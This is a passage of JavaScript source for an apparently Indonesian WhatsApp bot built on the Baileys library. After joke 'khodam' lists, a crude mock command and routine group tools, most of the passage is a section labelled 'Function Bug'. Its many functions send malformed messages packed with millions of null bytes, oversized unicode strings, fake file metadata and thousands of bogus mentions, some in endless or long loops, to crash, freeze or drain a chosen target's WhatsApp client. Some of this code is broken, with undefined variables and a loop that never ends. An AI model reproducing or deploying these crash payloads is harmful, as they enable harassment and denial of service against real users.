"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  payreply(kodamn)
}
break

case "cekkontol": case "kontol": {
if (!q) return payreply(`Ketik Nama Yang Mau Di Cek.
Example : 
${prefix+command} depay`)

	const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
    `punya si ${q} ada sih tapi mode hemat energi 🗿`,
    `scan selesai... punya ${q} terdeteksi tapi ukuran nano`,
    `punya ${q} ada tapi lagi sembunyi jir 😹`,
    `punya ${q} offline dulu katanya malu`,
    `punya ${q} ketemu... tapi kecil bet anjir`,
    `punya ${q} hilang di semak semak`,
    `punya ${q} ada tapi lagi update sistem`,
    `punya ${q} lagi loading sabar bang`,
    `punya ${q} ketahuan tapi mini size 😭`,
    `punya ${q} ada tapi takut keluar`,
    `punya ${q} scan gagal... terlalu kecil buat dideteksi`,
    `punya ${q} ada tapi lagi AFK`,
    `punya ${q} ketemu tapi cuma trial version`,
]
const kodam = khodam[Math.floor(Math.random() * khodam.length)]

	const respons = `
 °「 *CEK KONTOL* 」°

 • *Nama :* ${q}
 • *Kontol :* ${kodam}
	  `
  
	payreply(respons)
  }
break
            case 's': 
            case 'sticker': 
            case 'stiker': {  
                
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await depayy.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return payreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nJika Media Yang Ingin Dijadikan Sticker Adalah Video, Batas Maksimal Durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await depayy.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    payreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break

case "kick":
case "kik":
case "dor": {
    if (!m.isGroup) return payreply(mess.group)
    if (!m.quoted && !m.mentionedJid?.length && !text)
        return payreply("Reply / tag orang yang mau dikick")

    let users

    if (m.quoted) {
        users = m.quoted.sender
    } else if (m.mentionedJid.length > 0) {
        users = m.mentionedJid[0]
    } else {
        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    }

    try {
        await depayy.groupParticipantsUpdate(
            m.chat,
            [users],
            'remove'
        )

        payreply(`✅ Berhasil mengeluarkan @${users.split('@')[0]}`, {
            mentions: [users]
        })

    } catch (err) {
        console.log(err)
        payreply("❌ Gagal kick user")
    }
}
break

                
case "ewe":
case "eweee":
case "woyyy": {
    if (!m.isGroup) return payreply(mess.group)
    if (!q && !m.quoted) return payreply(`Teksnya?`)

    if (m.quoted) {
        if (m.quoted.text || m.quoted.caption) {
            depayy.sendMessage(m.chat, {
                text: m.quoted.text || m.quoted.caption,
                mentions: participants.map(a => a.id)
            }, { quoted: qkontak })
        } else {
            depayy.sendMessage(m.chat, {
                forward: m.quoted.fakeObj,
                mentions: participants.map(a => a.id)
            })
        }
    }

    if (!m.quoted) {
        depayy.sendMessage(m.chat, {
            text: q ? q : '',
            mentions: participants.map(a => a.id)
        }, { quoted: qkontak })
    }
}
break

case "tag-all": {
  if (!isGroup) return payreply(mess.group)
  if (!text) return payreply("pesannya")

  let teks = text + "\n\n"

  let groupMetadata
  try {
    groupMetadata = await depayy.groupMetadata(m.chat)
  } catch {
    return
  }

  let member = groupMetadata.participants
    .map(v => v.id)
    .filter(e => e !== botNumber && e !== m.sender)

  for (let e of member) {
    teks += `@${e.split("@")[0]}\n`
  }

  await depayy.sendMessage(
    m.chat,
    { text: teks, mentions: member },
    { quoted: m }
  )
}
break

case 'open':
case 'buka': {
    if (!m.isGroup) return payreply(mess.group)
    depayy.groupSettingUpdate(m.chat, 'not_announcement')
    payreply('✅ Grup berhasil dibuka')
}
break

case 'close':
case 'tutup': {
    if (!m.isGroup) return payreply(mess.group)
    depayy.groupSettingUpdate(m.chat, 'announcement')
    payreply('✅ Grup berhasil ditutup')
}
break

case 'qc': {
  if (!q) return payreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await depayy.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  depayy.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

// Function Bug
//efci ipon
async function NikaCrashios(depayy, target) {
  let message = {
    locationMessage: {
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    } 
  }; 
  
  const msg = await generateWAMessageFromContent(target, message, {});
  await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });
}
//function efci
async function crasHidd(target) {
  await depayy.relayMessage(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "Zenith by Ken",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  }, { participant: { jid: target }});
}
async function Fcinpis(depayy, target, mention) {
try {
const generateId = () => Math.random().toString(36).substring(2, 15);
const msg = generateWAMessageFromContent(target, {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "RansX7",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
    }, {}) ;

    await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

if (mention) {
    await depayy.relayMessage(
      target,
      {
    statusMentionMessage: {
        message: {
           protocolMessage: {
              key: msg.key,
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "false" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
 };
 
   } catch (error) {
    console.error(`Error${error.message}`);
    }
 }
 
async function FcF4X(depayy, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "CSMX",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await depayy.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await depayy.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Pahina bre",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permissiom_request",
              paramsJson: "\u0010".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "call_permissiom_request"
            }
          }
        }
      }
    },
    {}
  );
}
async function F4x(depayy, target) {
  while (Date.now() - Date.now() < 200000) {
    let message = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "kyaknya kita udh gabisa bareng,mksih atas semua ap yg udh kamu kasih ke aku,aku gabisa toleransi sifat & sikap kamu.",
        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
        fileLength: "19769",
        height: 354,
        width: 783,
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [
          24378, 
          17332
        ],
        contextInfo: {
         urlTrackingMap: {
           urlTrackingMapElements: Array.from(
             { length: 500000 },
             () => ({ "\0": "\0" })
            )
          }, 
          remoteJid: "status@broadcast", 
          groupMentions: [], 
          entryPointConversionSource: "booking_status"
        }
      }
    };
    
    const msg = generateWAMessageFromContent(jid, message, {});
    await depayy.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [jid], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: jid }, content: undefined
          }]
        }]
      }]
    }); 
    await new Promise((r) => setTimeout(r, 2000));
  }
}
//function blank
async function FrezeeChat(depayy, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo"
            },
            nativeFlowMessage: {
              buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});

await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function sendAllMessages(depayy, target) {
  await depayy.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "MakLo"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await depayy.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await depayy.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await depayy.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function xxx(depayy,target) {
    const msg2 = {
        interactiveMessage: {
            header: {
                title: "Zenith is bak?",
                },
            body: {},
            footer: {
                text: "Zenth by Ken",
                hasMediaAttachment: true,
      audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mp4",
      fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
      fileLength: "109951162777600",
      seconds: 1,
      ptt: true,
      mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
      fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
      directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774107510",
      waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
      }
    },
            nativeFlowMessage: {
                buttons: [
                    {
  name: "single_select",
  buttonParamsJson: JSON.stringify({
    title: "Iamsatz",
    sections: [
      {
        title: "",
        rows: Array.from({ length: 4 }, (_, i) => ({
          id: "\u0000".repeat(9000),
          title: "\u0000".repeat(10000)
        }))
      }
    ]
  })
},
                    {
  name: "cta_call",
  buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "\u0000".repeat(5000)
                })
}
                    ]
                },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                quotedMessage: {
                    conversation: "𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍"
                    },
                }
            }
        }
         
        await depayy.relayMessage(target,msg2,{
            participant: { jid: target }
            })
}
//function buldo
async function X7Bulldozer(depayy, target) {
  while (true) {
  await depayy.relayMessage(
    target,
    {
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
      },
      eventMessage: {
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          }
        },
        isCanceled: true,
        name: "𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
        startTime: "1764032400",
        extraGuestsAllowed: true,
        isScheduleCall: true
      }
    },
    { participant: { jid: target } }
  );
}
}
async function YouAreTheReason(depayy, target) {
  const memek = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  for (let i = 0; i < 1000; i++) {
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true',
            mimetype: 'image/webp',
            fileSha256: Buffer.from([187, 146, 22, 50, 195, 167, 208, 126, 9, 85, 68, 142, 83, 49, 94, 118, 1, 203, 45, 28, 56, 91, 122, 225, 139, 174, 84, 97, 202, 226, 252, 163]),
            fileEncSha256: Buffer.from([1, 254, 7, 45, 33, 43, 134, 167, 251, 8, 52, 166, 190, 90, 18, 147, 250, 143, 80, 250, 190, 46, 203, 103, 130, 205, 132, 101, 235, 40, 60, 22]),
            mediaKey: Buffer.from([234, 34, 50, 200, 155, 222, 255, 16, 171, 221, 14, 53, 40, 212, 205, 246, 163, 9, 7, 35, 191, 155, 107, 246, 33, 191, 184, 168, 105, 109, 140, 184]),
            fileLength: 3304,
            directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
            mediaKeyTimestamp: 1746262763,
            contextInfo: {
              mentionedJid: memek,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "_D7R", 
                        format: "DEFAULT" 
                      },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0007".repeat(90000),
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }, {});

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { 
              text: "#", 
              format: "DEFAULT" 
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"KANJUT","landmark_area":"H","address":"cirayap","tower_number":"44188","city":"Garut","name":"JawaBarat","phone_number":"7777777","house_number":"xxx","floor_number":"xxx","state":"D7R | ${"\u0000".repeat(90000)}"}}`,
              version: 3
            },
            contextInfo: {
              mentionedJid: memek,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "_D7R", 
                        format: "DEFAULT" 
                      },
                      nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{"state":"${"\u0000".repeat(90000)}","building":"${"\u0000".repeat(70000)}","city":"${"\u0000".repeat(70000)}"}`,
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }, {});

    await depayy.relayMessage(target, {
      groupStatusMentionMessage: {
        message: msg1.message
      }
    }, { 
    messageId: msg1.key.id, 
    participant: { jid: target } 
    }
  );
  
    await depayy.relayMessage(target, {
      groupStatusMentionMessage: {
        message: msg2.message
      }
    }, { 
    messageId: msg2.key.id, 
    participant: { jid: target } 
    }
  );
    await new Promise((r) => setTimeout(r, 1500));
  }
}
// Function bebas spam
async function Colmek(depayy, target) {
  const msgXnxxCom = {
    interactiveResponseMessage: {
      body: {
        text: "",
        format: "DEFFAULT"
      },
      nativeFlowResponseMessage: {
        paramsJson: `{"state":"${"\u0000".repeat(16900)}","building":"${"\u0000".repeat(16900)}","city":"${"\u0000".repeat(16900)}"}`,
        version: 3
      }
    }
  };

  await depayy.relayMessage(target, msgXnxxCom, {
    participant: { 
      jid: target 
    }
  });
}
async function delayHardCuy(depayy, target) {
  await depayy.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}
/*
Delay bebas spam
Lop sesuai kenyamanan 
Sedot Kouta perdetik 
Not tag broadcast 
*/
async function ngaceng(depayy, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
